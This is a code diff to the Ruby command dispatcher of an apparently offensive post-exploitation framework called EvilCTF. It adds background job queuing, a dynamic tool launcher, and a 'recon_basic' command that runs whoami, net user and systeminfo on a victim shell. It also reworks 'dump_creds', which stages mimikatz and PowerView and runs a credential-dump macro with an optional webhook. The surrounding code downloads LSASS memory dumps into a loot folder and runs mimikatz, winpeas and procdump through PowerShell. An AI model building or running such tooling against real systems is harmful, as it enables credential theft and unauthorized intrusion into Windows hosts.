@@ -7,6 +7,9 @@ require_relative 'execution'
 require_relative 'uploader'
 require_relative 'enums'
 require_relative 'sql_enum'
+require_relative 'async_worker'
+require_relative 'tool_registry'
+require_relative 'engine_audit'
 
 module EvilCTF
   # Dispatcher for handling commands in the EvilCTF session.
@@ -33,6 +36,7 @@ module EvilCTF
       @mutex = Monitor.new
       @handlers = {}
       @pass_through = true # Default: pass unknown commands through
+      @async_worker = EvilCTF::AsyncWorker.new
 
       # Pre-register all handlers
       register_core_commands
@@ -82,9 +86,41 @@ module EvilCTF
       return { ok: false, output: '', handled: false } unless handler
 
       begin
-        output = handler.call(shell, args, session_options)
-        { ok: true, output: output.to_s, handled: true }
+        handler_result = handler.call(shell, args, session_options)
+
+        # Handlers may return either a plain output object or a structured
+        # dispatcher result hash ({ ok:, output:, error:, handled: }).
+        if handler_result.is_a?(Hash) && (handler_result.key?(:ok) || handler_result.key?('ok'))
+          ok_value = handler_result.key?(:ok) ? handler_result[:ok] : handler_result['ok']
+          output_value = if handler_result.key?(:output)
+                           handler_result[:output]
+                         else
+                           handler_result['output']
+                         end
+          error_value = if handler_result.key?(:error)
+                          handler_result[:error]
+                        else
+                          handler_result['error']
+                        end
+          handled_value = if handler_result.key?(:handled)
+                            handler_result[:handled]
+                          elsif handler_result.key?('handled')
+                            handler_result['handled']
+                          else
+                            true
+                          end
+
+          return {
+            ok: !!ok_value,
+            output: output_value.to_s,
+            error: error_value,
+            handled: handled_value.nil? ? true : !!handled_value
+          }
+        end
+
+        { ok: true, output: handler_result.to_s, handled: true }
       rescue => e
+        EvilCTF::EngineAudit.error(message: "dispatcher handler failed: #{command_key}", error: e, source: 'command_dispatcher')
         { ok: false, output: '', error: e.message, handled: true }
       end
     end
@@ -156,8 +192,44 @@ module EvilCTF
 
       # tools
       register('tools') do |shell, args, session_options|
+        root = File.expand_path('../..', __dir__)
+        registry = EvilCTF::ToolRegistry.new(root_path: root)
+        tools = registry.scan
+        if tools.empty?
+          puts '[!] No tools discovered in tools/'
+        else
+          puts "[*] Dynamic Tool Registry (#{tools.size} entries)"
+          tools.each do |tool|
+            required = Array(tool.metadata['required_args']).join(', ')
+            puts "- #{tool.name} (required_args: #{required.empty? ? 'none' : required})"
+          end
+        end
         EvilCTF::Tools.list_available_tools
         ''
+      end
+
+      register('tool') do |shell, args, session_options|
+        root = File.expand_path('../..', __dir__)
+        registry = EvilCTF::ToolRegistry.new(root_path: root)
+        raw = args.to_s.strip
+        return "Usage: tool <name> key=value ..." if raw.empty?
+
+        tokens = raw.split(/\s+/)
+        name = tokens.shift
+        parsed_args = {}
+        tokens.each do |token|
+          key, value = token.split('=', 2)
+          parsed_args[key.to_s] = value.to_s
+        end
+
+        payload = registry.build_invocation(tool_name: name, arguments: parsed_args)
+        return payload[:error] if payload.nil? || payload[:error]
+
+        @async_worker.enqueue(priority: 50, name: "tool:#{name}", shell: shell, command: payload[:command])
+        "Queued tool '#{name}'"
+      rescue StandardError => e
+        EvilCTF::EngineAudit.error(message: 'tool command failed', error: e, source: 'command_dispatcher')
+        "tool command failed: #{e.message}"
       end
 
       # download_missing
@@ -166,15 +238,41 @@ module EvilCTF
         ''
       end
 
+      register('recon_basic') do |shell, args, session_options|
+        logger = session_options[:logger] || OpenStruct.new
+        @async_worker.enqueue_block(priority: 20, name: 'recon_basic', logger: logger) do
+          begin
+            outputs = []
+            ['whoami /all', 'net user', 'systeminfo'].each do |cmd|
+              res = EvilCTF::Execution.run(shell, cmd, timeout: 60)
+              outputs << "> #{cmd}\n#{res.output}"
+            end
+            logger&.info('[recon_basic] completed')
+            outputs.join("\n")
+          rescue StandardError => e
+            EvilCTF::EngineAudit.error(message: 'recon_basic background job failed', error: e, source: 'command_dispatcher')
+            raise
+          end
+        end
+        'Queued recon_basic in background job queue'
+      end
+
       # dump_creds
       register('dump_creds') do |shell, args, session_options|
         logger = session_options[:logger] || OpenStruct.new
         command_manager = session_options[:command_manager]
 
-        EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
-        EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-        command_manager.expand_macro('dump_creds', shell, webhook: session_options[:webhook])
-        ''
+        @async_worker.enqueue_block(priority: 10, name: 'dump_creds', logger: logger) do
+          begin
+            EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
+            EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
+            command_manager.expand_macro('dump_creds', shell, webhook: session_options[:webhook])
+          rescue StandardError => e
+            EvilCTF::EngineAudit.error(message: 'dump_creds background job failed', error: e, source: 'command_dispatcher')
+            raise
+          end
+        end
+        'Queued dump_creds in background job queue'
       end
 
       # lsass_dump
@@ -259,9 +357,9 @@ module EvilCTF
 
         if dump_path
           EvilCTF::Uploader.download_file(
-            dump_path,
-            "loot/lsass_#{session_options[:ip]}.dmp",
-            shell
+            remote_path: dump_path,
+            local_path: "loot/lsass_#{session_options[:ip]}.dmp",
+            shell: shell
           )
         else
           puts '[!] No LSASS dump file found in C:\\Users\\Public after procdump execution.'
@@ -434,7 +532,7 @@ module EvilCTF
                       \$proc.Kill()
                     }
                   } catch {
-                    Write-Output "Error executing mimikatz: \$_ .Exception.Message"
+                    Write-Output "Error executing mimikatz: \$_.Exception.Message"
                   }
                 PS
                 exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
@@ -453,7 +551,7 @@ module EvilCTF
                       \$proc.Kill()
                     }
                   } catch {
-                    Write-Output "Error executing winpeas: \$_ .Exception.Message"
+                    Write-Output "Error executing winpeas: \$_.Exception.Message"
                   }
                 PS
                 exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 70)
@@ -472,7 +570,7 @@ module EvilCTF
                       \$proc.Kill()
                     }
                   } catch {
-                    Write-Output "Error executing procdump: \$_ .Exception.Message"
+                    Write-Output "Error executing procdump: \$_.Exception.Message"
                   }
                 PS
                 exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
@@ -491,7 +589,7 @@ module EvilCTF
                       \$proc.Kill()
                     }
                   } catch {
-                    Write-Output "Error executing #{key}: \$_ .Exception.Message"
+                    Write-Output "Error executing #{key}: \$_.Exception.Message"
                   }
                 PS
                 exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
@@ -523,7 +621,7 @@ module EvilCTF
                         \$proc.Kill()
                       }
                     } catch {
-                      Write-Output "Error executing #{key}: \$_ .Exception.Message"
+                      Write-Output "Error executing #{key}: \$_.Exception.Message"
                     }
                   PS
                   exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
